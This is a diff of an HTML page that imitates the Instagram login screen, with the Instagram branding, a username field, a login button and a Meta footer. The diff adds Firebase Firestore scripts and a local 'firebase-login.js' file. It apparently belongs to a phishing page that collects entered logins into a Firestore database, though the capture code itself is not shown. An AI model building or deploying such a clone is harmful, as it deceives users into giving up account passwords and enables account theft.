@@ -1,169 +1,43 @@
 <!DOCTYPE html>
-<html lang="en" dir="ltr">
+<html lang="en">
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 <title>Instagram</title>
-<style>
-  * { margin: 0; padding: 0; box-sizing: border-box; }
-  body {
-    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-    background: #fafafa;
-    color: #262626;
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    justify-content: center;
-    min-height: 100vh;
-    padding: 20px 0;
-  }
-  .container {
-    width: 350px;
-    max-width: 100%;
-  }
-  .box {
-    background: #fff;
-    border: 1px solid #dbdbdb;
-    padding: 40px 40px 20px;
-    margin-bottom: 10px;
-    text-align: center;
-    border-radius: 1px;
-  }
-  .logo {
-    font-family: "Grand Hotel", cursive;
-    font-size: 42px;
-    margin: 12px auto 30px;
-    background: linear-gradient(45deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888);
-    -webkit-background-clip: text;
-    -webkit-text-fill-color: transparent;
-    background-clip: text;
-    font-weight: 400;
-    letter-spacing: 1px;
-  }
-  .logo-fallback {
-    font-family: "Segoe Script","Snell Roundhand",cursive;
-  }
-  form { display: flex; flex-direction: column; }
-  .input-wrap {
-    position: relative;
-    margin-bottom: 6px;
-  }
-  input {
-    width: 100%;
-    background: #fafafa;
-    border: 1px solid #dbdbdb;
-    border-radius: 3px;
-    padding: 9px 8px 7px;
-    font-size: 12px;
-    color: #262626;
-    outline: none;
-  }
-  input:focus { border-color: #a8a8a8; }
-  .btn-login {
-    background: #0095f6;
-    color: #fff;
-    border: none;
-    border-radius: 8px;
-    padding: 7px 16px;
-    font-size: 14px;
-    font-weight: 600;
-    margin-top: 8px;
-    cursor: pointer;
-  }
-  .btn-login:disabled { background: #b2dffc; cursor: default; }
-  .divider {
-    display: flex;
-    align-items: center;
-    margin: 18px 0;
-  }
-  .divider::before, .divider::after {
-    content: "";
-    flex: 1;
-    height: 1px;
-    background: #dbdbdb;
-  }
-  .divider span {
-    margin: 0 18px;
-    color: #8e8e8e;
-    font-size: 13px;
-    font-weight: 600;
-  }
-  .fb-login {
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    gap: 8px;
-    color: #385185;
-    font-size: 14px;
-    font-weight: 600;
-    margin: 8px 0 14px;
-    cursor: pointer;
-  }
-  .fb-icon {
-    width: 16px; height: 16px;
-    background: #385185;
-    color: #fff;
-    border-radius: 3px;
-    font-size: 13px;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    font-weight: 700;
-  }
-  .forgot {
-    color: #00376b;
-    font-size: 12px;
-    display: block;
-    margin-top: 4px;
-  }
-  .signup-box {
-    background: #fff;
-    border: 1px solid #dbdbdb;
-    padding: 20px;
-    text-align: center;
-    font-size: 14px;
-    border-radius: 1px;
-  }
-  .signup-box a {
-    color: #0095f6;
-    text-decoration: none;
-    font-weight: 600;
-  }
-  .get-app {
-    text-align: center;
-    margin: 20px 0 12px;
-    font-size: 14px;
-  }
-  .store-badges {
-    display: flex;
-    justify-content: center;
-    gap: 8px;
-    margin-top: 12px;
-  }
-  .store-badges img { height: 40px; }
-  footer {
-    margin-top: 30px;
-    font-size: 12px;
-    color: #8e8e8e;
-    text-align: center;
-    max-width: 640px;
-  }
-  footer a { color: #8e8e8e; text-decoration: none; margin: 0 6px; }
-  .status {
-    font-size: 12px;
-    margin-top: 6px;
-    min-height: 14px;
-  }
-  .status.err { color: #ed4956; }
-  .status.ok { color: #00a400; }
-  a { text-decoration: none; }
-</style>
 <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">
+<style>
+  *{margin:0;padding:0;box-sizing:border-box;}
+  body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;background:#fafafa;color:#262626;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;padding:20px 0;}
+  .container{width:350px;max-width:100%;}
+  .box{background:#fff;border:1px solid #dbdbdb;padding:40px 40px 20px;margin-bottom:10px;text-align:center;border-radius:1px;}
+  .logo{font-family:"Grand Hotel",cursive;font-size:48px;margin:12px auto 30px;font-weight:400;}
+  form{display:flex;flex-direction:column;}
+  .input-wrap{position:relative;margin-bottom:6px;}
+  input{width:100%;background:#fafafa;border:1px solid #dbdbdb;border-radius:3px;padding:9px 8px 7px;font-size:12px;color:#262626;outline:none;}
+  input:focus{border-color:#a8a8a8;}
+  .btn-login{background:#0095f6;color:#fff;border:none;border-radius:8px;padding:7px 16px;font-size:14px;font-weight:600;margin-top:8px;cursor:pointer;}
+  .btn-login:disabled{background:#b2dffc;cursor:default;}
+  .divider{display:flex;align-items:center;margin:18px 0;}
+  .divider::before,.divider::after{content:"";flex:1;height:1px;background:#dbdbdb;}
+  .divider span{margin:0 18px;color:#8e8e8e;font-size:13px;font-weight:600;}
+  .fb-login{display:flex;align-items:center;justify-content:center;gap:8px;color:#385185;font-size:14px;font-weight:600;margin:8px 0 14px;cursor:pointer;}
+  .fb-icon{width:16px;height:16px;background:#385185;color:#fff;border-radius:3px;font-size:13px;display:flex;align-items:center;justify-content:center;font-weight:700;}
+  .forgot{color:#00376b;font-size:12px;display:block;margin-top:4px;}
+  .signup-box{background:#fff;border:1px solid #dbdbdb;padding:20px;text-align:center;font-size:14px;border-radius:1px;}
+  .signup-box a{color:#0095f6;text-decoration:none;font-weight:600;}
+  .get-app{text-align:center;margin:20px 0 12px;font-size:14px;}
+  footer{margin-top:30px;font-size:12px;color:#8e8e8e;text-align:center;max-width:640px;}
+  footer a{color:#8e8e8e;text-decoration:none;margin:0 6px;}
+  .status{font-size:12px;margin-top:8px;min-height:14px;word-wrap:break-word;padding:0 4px;}
+  .status.err{color:#ed4956;}
+  .status.ok{color:#00a400;}
+  a{text-decoration:none;}
+</style>
 </head>
 <body>
   <div class="container">
     <div class="box">
-      <div class="logo logo-fallback">Instagram</div>
+      <div class="logo">Instagram</div>
       <form id="loginForm">
         <div class="input-wrap">
           <input id="username" type="text" placeholder="Phone number, username, or email" autocomplete="off" required />
@@ -187,22 +61,19 @@
     </div>
 
     <div class="get-app">Get the app.</div>
-    <div class="store-badges">
-      <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="App Store" />
-      <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Google Play" />
-    </div>
   </div>
 
   <footer>
     <div>
       <a href="#">Meta</a><a href="#">About</a><a href="#">Blog</a><a href="#">Jobs</a>
-      <a href="#">Help</a><a href="#">API</a><a href="#">Privacy</a><a href="#">Terms</a>
-      <a href="#">Locations</a><a href="#">Instagram Lite</a>
+      <a href="#">Help</a><a href="#">Privacy</a><a href="#">Terms</a>
     </div>
     <div style="margin-top:12px;">English &nbsp;© 2026 Instagram from Meta</div>
   </footer>
 
-  <!-- Firebase + login logic -->
-  <script type="module" src="assets/firebase-login.js"></script>
+  <!-- Firebase compat SDK (أسرع وأثبت من الـ module في التجارب) -->
+  <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore-compat.js"></script>
+  <script src="assets/firebase-login.js"></script>
 </body>
-  </html>
+</html>
